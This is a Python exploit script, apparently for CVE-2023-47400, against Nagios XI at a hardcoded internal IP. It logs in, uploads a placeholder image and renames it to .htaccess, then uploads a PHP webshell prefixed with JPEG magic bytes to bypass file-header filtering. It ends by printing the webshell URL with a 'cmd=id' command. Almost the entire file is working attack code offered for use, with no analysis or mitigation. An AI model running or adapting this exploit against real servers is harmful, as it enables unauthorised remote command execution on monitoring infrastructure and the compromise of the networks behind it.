import logging
from sys import exit, argv
from requests import Session
from lxml import html
from uuid import uuid4

# TODO handle this by cli args
NAGIOS_URL="https://10.10.11.248/nagiosxi"
USERNAME="user"
PASSWORD="pass"

JPEG_MAGIC_BYTES=b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01"
# Try other magic bytes if this one doesn't work : https://en.wikipedia.org/wiki/List_of_file_signatures

def bootstrap_session():
    s = Session()
    s.trust_env = True # allow usage of HTTP_PROXY env var for DEBUG
    s.verify = False
    return s

def get_nsp_token(session) -> str:
    resp = session.get(f"{NAGIOS_URL}/login.php")
    login_page = html.fromstring(resp.content)
    csrf_token = login_page.xpath("/html/body/div/div[4]/div/div[1]/div[1]/div[1]/form/input[1]/@value")[0]
    return csrf_token

def log_in(session, nsp_token, username, password):
    # prepare headers and payload
    headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    }
    payload={
        'nsp': nsp_token,
        'page': 'auth',
        'debug': '',
        'pageopt': 'login',
        'username': username,
        'password': password,
        'loginButton': ''
    }
    # send POST request on /login.php to authenticate
    login_response = session.post(url=f"{NAGIOS_URL}/login.php", data=payload, headers=headers)
    return login_response

def upload_placeholder_image(session):
    # prepare request
    files = {'uploadedfile': ('placeholder.jpg', JPEG_MAGIC_BYTES, 'image/jpeg')}
    resp = session.post(f"{NAGIOS_URL}/includes/components/custom-includes/manage.php?cmd=upload", files=files)
    return resp

def overwrite_htaccess(session, upload_placeholder_image_response):
    # retrieve file id and rename it to .htaccess
    file_upload_page = html.fromstring(upload_placeholder_image_response.content)
    image_id = file_upload_page.xpath('//*[@data-name="placeholder.jpg"]/@data-obj-id')[0]
    headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data={
        'id': image_id,
        'name': '.htaccess'
    }
    session.post(f"{NAGIOS_URL}/includes/components/custom-includes/manage.php?cmd=rename", data=data, headers=headers)
    return session.get(f"{NAGIOS_URL}/includes/components/custom-includes/manage.php?cmd=delete&type=images&id={image_id}")

def upload_webshell(session, webshell_name, webshell_data):
    # prepare request
    files = {'uploadedfile': (f"{webshell_name}.jpg.php", webshell_data, 'application/x-php')}
    resp = session.post(f"{NAGIOS_URL}/includes/components/custom-includes/manage.php?cmd=upload", files=files)
    return resp

"""Build payload which bypasses file header filtering"""
def build_payload():
    with open("payload.php", "rb") as file:
        exploit = JPEG_MAGIC_BYTES
        exploit += file.read()
    return exploit

"""Run exploit"""
def main() -> int:
    # setup logging module
    logger = logging.getLogger()
    logger.name = "cve_2023_47400"
    logger.setLevel(level=logging.DEBUG)

    try:
        # create session
        sess = bootstrap_session()
        # pre-flight request to aquire NSP token in index.php
        nsp = get_nsp_token(sess)
        # login with provided credentials
        log_in_response = log_in(sess, nsp, USERNAME, PASSWORD)
        if log_in_response.status_code == 200:
            logging.info("Login successful")
        else:
            logging.info("Login unsuccessful")
            return 1
        # upload placeholder image
        upload_placeholder_image_response = upload_placeholder_image(sess)
        if upload_placeholder_image_response.status_code == 200:
            logging.info("Successfuly uploaded placeholder.jpg")
        else:
            logging.info("Unsuccessful attempt to upload placeholder.jpg")
            return 1
        
        overwrite_htaccess_response = overwrite_htaccess(sess, upload_placeholder_image_response)
        if overwrite_htaccess_response.status_code == 200:
           logging.info("Successfuly overwritten .htaccess")
        else:
            logging.info("Unsuccessful attempt to overwrite .htaccess")
            return 1

        webshell_name = uuid4()
        webshell_data = build_payload()
        upload_webshell_response = upload_webshell(sess, webshell_name, webshell_data)
        if upload_webshell_response.status_code == 200:
            logging.info("Successfuly uploaded webshell")
            logging.info(f"{NAGIOS_URL}/includes/components/custom-includes/images/{webshell_name}.jpg.php?cmd=id")
        else:
            logging.info("Unsuccessful attempt to upload webshell")
            return 1

        
    # exits gracefully on CTRL+C
    except KeyboardInterrupt:
        logging.info("Exiting script gracefully")
        return 0
    # exits with error code 1 in another exceptions
    except Exception as err:
        logging.critical("Exiting due to error")
        logging.debug(err)
        return 1

if __name__ == '__main__':
    exit(main())
